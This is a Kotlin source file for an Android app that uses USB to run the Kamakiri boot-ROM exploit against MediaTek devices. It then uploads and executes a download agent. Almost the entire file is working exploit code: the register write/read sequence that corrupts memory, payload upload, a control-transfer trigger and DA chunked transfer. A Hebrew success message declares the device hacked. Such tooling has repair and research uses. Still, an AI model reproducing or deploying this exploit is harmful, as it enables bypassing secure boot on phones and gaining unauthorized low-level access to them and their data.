package com.example.mtkusbtool

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.Locale

object MtkBromConnection {

    fun runKamakiriAndSendDa(
        usbManager: UsbManager,
        device: UsbDevice,
        payloadBytes: ByteArray,
        daBytes: ByteArray,
        onProgress: (String) -> Unit
    ): String {
        val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."

        var epIn: UsbEndpoint? = null
        var epOut: UsbEndpoint? = null
        for (i in 0 until device.interfaceCount) {
            val usbInterface = device.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                    }
                }
                if (epIn != null && epOut != null) break
            }
        }

        if (epIn == null || epOut == null) {
            connection.close()
            return "שגיאה: לא נמצאו נקודות קצה."
        }

        fun usbwrite(data: ByteArray): Boolean {
            return connection.bulkTransfer(epOut, data, data.size, 2000) >= 0
        }

        fun usbread(len: Int): ByteArray {
            val buf = ByteArray(len)
            connection.bulkTransfer(epIn, buf, len, 2000)
            return buf
        }

        fun echo(data: ByteArray) {
            usbwrite(data)
            usbread(data.size)
        }

        fun readDword(): Int {
            val bytes = usbread(4)
            if (bytes.size < 4) return -1
            return ByteBuffer.wrap(bytes).order(ByteOrder.BIG_ENDIAN).int
        }

        fun read32(addr: Int, dwords: Int) {
            echo(byteArrayOf(0xD1.toByte()))
            echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array())
            echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(dwords).array())
            val status = readDword()
            if (status > 0xFF) return
            usbread(dwords * 4)
            usbread(2)
        }

        fun write32(addr: Int, values: IntArray) {
            echo(byteArrayOf(0xD4.toByte()))
            echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array())
            echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(values.size).array())
            val status = readDword()
            if (status > 0xFF) return
            for (v in values) {
                echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(v).array())
            }
        }

        onProgress("Starting Kamakiri exploit...")

        val addr = 0x10007050
        val revdwordPayloadAddr = 0x000A1000

        write32(addr, intArrayOf(revdwordPayloadAddr))
        for (i in 0 until 0xF) {
            read32(addr - (0xF - i) * 4, 0xF - i + 1)
        }

        onProgress("echo 0xE0...")
        echo(byteArrayOf(0xE0.toByte()))

        onProgress("send payload length...")
        echo(ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(payloadBytes.size).array())

        onProgress("check status...")
        usbread(2)

        onProgress("Sending payload...")
        usbwrite(payloadBytes)

        onProgress("read ack...")
        usbread(2)
        usbread(2)

        onProgress("Triggering ctrl_transfer...")
        try {
            connection.controlTransfer(0xA1, 0, 0, 0x25, null, 0, 1000)
        } catch (e: Exception) {
            onProgress("ctrl_transfer returned: ${e.message}")
        }

        // --- Send 0xD2 to prevent reset ---
        onProgress("Sending 0xD2 (prevent reset)...")
        if (usbwrite(byteArrayOf(0xD2.toByte()))) {
            onProgress("0xD2 sent successfully!")
        } else {
            onProgress("0xD2 failed - connection may be dead")
        }

        // --- Send DA on same connection ---
        onProgress("Sending DA on same connection...")
        
        if (!usbwrite(byteArrayOf(0xD7.toByte()))) {
            connection.close()
            return "שגיאה: שליחת פקודת DA (0xD7) נכשלה."
        }
        
        val ack1 = usbread(1)
        if (ack1.isEmpty() || ack1[0] != 0xD8.toByte()) {
            val hex = if(ack1.isNotEmpty()) String.format(Locale.US, "0x%02X", ack1[0]) else "אין"
            connection.close()
            return "שגיאה: תגובה ל-0xD7 לא תקינה ($hex)."
        }

        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(daBytes.size).array()
        if (!usbwrite(sizeBytes)) {
            connection.close()
            return "שגיאה: שליחת גודל נכשלה."
        }

        val ack2 = usbread(1)
        if (ack2.isEmpty() || ack2[0] != 0xD9.toByte()) {
            val hex = if(ack2.isNotEmpty()) String.format(Locale.US, "0x%02X", ack2[0]) else "אין"
            connection.close()
            return "שגיאה: תגובה לגודל לא תקינה ($hex)."
        }

        var offset = 0
        val chunkSize = 512
        while (offset < daBytes.size) {
            val length = minOf(chunkSize, daBytes.size - offset)
            val chunk = daBytes.copyOfRange(offset, offset + length)

            if (!usbwrite(chunk)) {
                connection.close()
                return "שגיאה: שליחת נתונים נכשלה ב-$offset."
            }

            val ack = usbread(1)
            if (ack.isEmpty() || (ack[0] != 0x5A.toByte() && ack[0] != 0x5F.toByte())) {
                val hex = if(ack.isNotEmpty()) String.format(Locale.US, "0x%02X", ack[0]) else "אין"
                connection.close()
                return "שגיאה: תגובה לא תקינה לנתונים ב-$offset ($hex)."
            }

            offset += length
            if (offset % (chunkSize * 20) == 0) {
                onProgress("DA: ${(offset * 100) / daBytes.size}%")
            }
        }

        onProgress("Running DA...")
        if (!usbwrite(byteArrayOf(0xD5.toByte()))) {
            connection.close()
            return "שגיאה: שליחת פקודת הרצה נכשלה."
        }

        usbread(2)
        connection.close()
        return "הצלחה מסחררת!!! Kamakiri עבד וה-DA נטען. המכשיר פרוץ!"
    }
}
